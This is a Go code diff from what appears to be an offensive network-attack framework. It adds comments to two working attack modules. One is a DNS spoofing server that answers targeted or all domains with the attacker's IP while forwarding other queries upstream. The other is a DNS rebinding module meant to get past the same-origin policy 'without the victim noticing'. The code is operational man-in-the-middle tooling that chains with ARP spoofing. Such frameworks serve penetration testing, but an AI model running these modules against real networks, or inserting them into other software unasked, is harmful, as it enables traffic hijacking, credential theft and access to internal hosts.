@@ -12,6 +12,7 @@ import (
 	"github.com/qyvora/toha3ee/internal/safety"
 )
 
+// init registers the DNS spoofing and DNS rebinding modules.
 func init() {
 	attacks.Register(&DNSSpoof{})
 	attacks.Register(&DNSRebind{})
@@ -20,19 +21,22 @@ func init() {
 // DNSSpoof runs a spoof-capable DNS server on :53 with upstream forwarding.
 type DNSSpoof struct{}
 
-// Meta implements attacks.Module.
+// Meta implements attacks.Module, returning the module's registry descriptor.
 func (*DNSSpoof) Meta() attacks.ModuleMeta {
 	return attacks.ModuleMeta{
-		ID:          "dns.spoof",
-		Category:    "mitm",
-		Risk:        attacks.RiskMedium,
-		Targets:     []string{"gateway", "host"},
+		ID:       "dns.spoof",
+		Category: "mitm",
+		Risk:     attacks.RiskMedium,
+		Targets:  []string{"gateway", "host"},
+		// Binding the privileged DNS port 53 (UDP and TCP) requires root.
 		Requires:    []string{"cap.dns_bind"},
 		Description: "spoof DNS answers for targeted domains while forwarding everything else upstream",
 		Limitations: "clients using DNS-over-HTTPS/TLS (port 853) bypass this; no effect unless the victim's DNS traffic is already hijacked by arp.spoof",
 	}
 }
 
+// dnsSpoofState is the per-run state stored in the AttackCtx; it holds the
+// running DNS server so Verify and Cleanup can reach it.
 type dnsSpoofState struct {
 	srv *dns.Server
 }
@@ -51,6 +55,8 @@ func (*DNSSpoof) Preflight(ctx *attacks.AttackCtx) (*attacks.PreflightReport, er
 	}
 	rep.AddOK("iface", ctx.Iface.String())
 
+	// Without at least one spoof rule the server would be a pure forwarder;
+	// flag that so the operator knows the attack will not spoof anything.
 	all := ctx.Conf.GetBool("dns.spoof", "all", false)
 	domains := splitCSV(ctx.Conf.Get("dns.spoof", "domains"))
 	if !all && len(domains) == 0 {
@@ -64,6 +70,8 @@ func (*DNSSpoof) Preflight(ctx *attacks.AttackCtx) (*attacks.PreflightReport, er
 // Run starts the DNS server and blocks until ctx.Done.
 func (m *DNSSpoof) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
 	all := ctx.Conf.GetBool("dns.spoof", "all", false)
+	// The target IP is what spoofed domains resolve to; it defaults to this
+	// host so victims' connections come back to us.
 	target := net.ParseIP(ctx.Conf.GetDefault("dns.spoof", "target", ctx.Iface.IP.String()))
 	if target == nil {
 		return fmt.Errorf("dns.spoof: bad target ip")
@@ -71,13 +79,17 @@ func (m *DNSSpoof) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
 
 	server := dns.New(ctx.Conf.Get("dns.spoof", "upstream"), ctx.Bus, ctx.Store, nil)
 	if all {
+		// Catch-all mode: every query is answered with the target IP.
 		server.AddRule("*", target)
 	} else {
+		// Selective mode: only the configured domains are hijacked; everything
+		// else is forwarded to the upstream resolver untouched.
 		for _, d := range splitCSV(ctx.Conf.Get("dns.spoof", "domains")) {
 			server.AddRule(d, target)
 		}
 	}
 
+	// Bind on the interface's IP so only hijacked DNS traffic lands here.
 	if err := server.Start([]string{ctx.Iface.IP.String() + ":53"}); err != nil {
 		return fmt.Errorf("dns.spoof: %w", err)
 	}
@@ -134,6 +146,8 @@ func (*DNSSpoof) Cleanup(ctx *attacks.AttackCtx) error {
 	return nil
 }
 
+// splitCSV splits a comma-separated list, trimming whitespace and dropping
+// empty entries so configs like "a.com, b.com, " parse cleanly.
 func splitCSV(s string) []string {
 	var out []string
 	for _, f := range strings.Split(s, ",") {
@@ -151,7 +165,7 @@ func splitCSV(s string) []string {
 // same-origin policy without the victim noticing a hostname change.
 type DNSRebind struct{}
 
-// Meta implements attacks.Module.
+// Meta implements attacks.Module, returning the module's registry descriptor.
 func (*DNSRebind) Meta() attacks.ModuleMeta {
 	return attacks.ModuleMeta{
 		ID:          "dns.rebind",
@@ -201,6 +215,8 @@ func (*DNSRebind) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
 
 	server := dns.New(ctx.Conf.Get("dns.rebind", "upstream"), ctx.Bus, ctx.Store, nil)
 	for _, d := range domains {
+		// Each domain alternates between this host's IP and the internal
+		// target, so consecutive queries flip the resolved address.
 		server.AddRebind(d, ctx.Iface.IP, target)
 	}
 	if err := server.Start([]string{ctx.Iface.IP.String() + ":53"}); err != nil {
@@ -251,6 +267,7 @@ func (*DNSRebind) Cleanup(ctx *attacks.AttackCtx) error {
 	return nil
 }
 
+// Compile-time assertions that both DNS modules implement attacks.Module.
 var _ attacks.Module = (*DNSRebind)(nil)
 
 var _ attacks.Module = (*DNSSpoof)(nil)
